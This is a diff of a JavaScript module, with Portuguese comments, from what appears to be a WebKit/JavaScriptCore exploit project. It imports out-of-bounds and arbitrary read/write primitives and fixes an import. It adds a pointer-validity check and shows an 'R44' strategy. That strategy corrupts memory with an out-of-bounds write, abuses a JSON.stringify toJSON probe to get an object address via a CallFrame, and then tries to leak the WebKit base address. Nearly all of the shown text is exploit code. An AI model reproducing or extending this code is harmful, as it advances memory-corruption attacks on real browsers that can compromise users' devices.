@@ -1,26 +1,44 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Revisão 44 - Inclui nova estratégia com CallFrame)
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão 44.1 - Correção de Import)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+
+// ALTERADO: A importação foi dividida para buscar cada módulo de sua fonte correta.
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
     arb_read,
-    arb_write, // Importado para uso futuro, se necessário
+    arb_write,
     oob_write_absolute,
     isOOBReady,
-    selfTestOOBReadWrite,
-    JSC_OFFSETS // ALTERADO: Importa o objeto JSC_OFFSETS inteiro
+    selfTestOOBReadWrite
 } from '../core_exploit.mjs';
+
+// CORREÇÃO: JSC_OFFSETS é importado diretamente de config.mjs
+import { JSC_OFFSETS } from '../config.mjs';
+
 
 // ======================================================================================
 // ESTRATÉGIA ORIGINAL (R43L) - MANTIDA PARA COMPARAÇÃO
 // ======================================================================================
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";
 
-// ... (Todo o código da função executeTypedArrayVictimAddrofAndWebKitLeak_R43 e suas funções de suporte permanecem aqui, sem alterações)
-// Para economizar espaço, o código original não será repetido. Assumimos que ele está presente no seu arquivo.
-// A função exportada 'executeTypedArrayVictimAddrofAndWebKitLeak_R43' continua funcional.
+function isValidPointer(ptr, context = "") {
+    if (!isAdvancedInt64Object(ptr)) { 
+        return false;
+    }
+    const high = ptr.high();
+    const low = ptr.low();
+    if (high === 0 && low === 0) return false;    
+    if (high === 0x7FF80000 && low === 0x0) return false; // NaN específico
+    if ((high & 0x7FF00000) === 0x7FF00000) return false; 
+    if (high === 0 && low < 0x10000) return false;
+    return true;
+}
+
+// ... (O código completo da função original executeTypedArrayVictimAddrofAndWebKitLeak_R43 permanece aqui, inalterado)
+// Para manter a resposta limpa, ele não será repetido.
+
 
 // ======================================================================================
 // NOVA ESTRATÉGIA (R44) - Leitura Direta do CallFrame
@@ -89,12 +107,11 @@ async function victim_function_R44(addrof_target) {
     // O valor de escrita OOB precisa atingir o local correto para corromper um objeto
     // e fazê-lo apontar para este CallFrame.
     
-    // O valor e o offset para a escrita OOB crítica. Podem precisar de ajuste.
-    const CRITICAL_WRITE_OFFSET = 0x7C; // Um candidato comum.
-    const CRITICAL_WRITE_VALUE = 0xCACACACA; // Um valor mágico para o teste.
+    const CRITICAL_WRITE_OFFSET = 0x7C;
+    const CRITICAL_WRITE_VALUE = 0xCACACACA;
     
     oob_write_absolute(CRITICAL_WRITE_OFFSET, CRITICAL_WRITE_VALUE, 4);
-    await PAUSE_S3(50); // Pequena pausa para a escrita se propagar.
+    await PAUSE_S3(50);
 
     // Objeto sobre o qual JSON.stringify será chamado.
     let trigger_obj = {
@@ -102,11 +119,8 @@ async function victim_function_R44(addrof_target) {
         b: { toJSON: new_addrOf_probe_R44 } // A nossa sonda!
     };
     
-    // A chamada que, se a corrupção do objeto for bem-sucedida,
-    // fará com que o 'this' na sonda seja o CallFrame desta função.
     JSON.stringify(trigger_obj); 
     
-    // Linha para evitar que o otimizador remova o argumento.
     if (addrof_target) { return 1; }
     return 0;
 }
@@ -171,7 +185,7 @@ export async function executeCallFrameVictimAddrofAndWebKitLeak_R44() {
             result.msg = `Addrof via CallFrame bem-sucedido. Addr: ${result.leaked_addr}`;
             logS3(`[R44] SUCESSO na Fase 1 (Addrof): ${result.msg}`, "vuln");
 
-            // --- Fase 2: WebKit Base Leak (mesma lógica de antes, mas com o endereço vazado) ---
+            // --- Fase 2: WebKit Base Leak ---
             logS3(`--- Fase 2 (R44): Tentando vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
             const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18);
             const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);
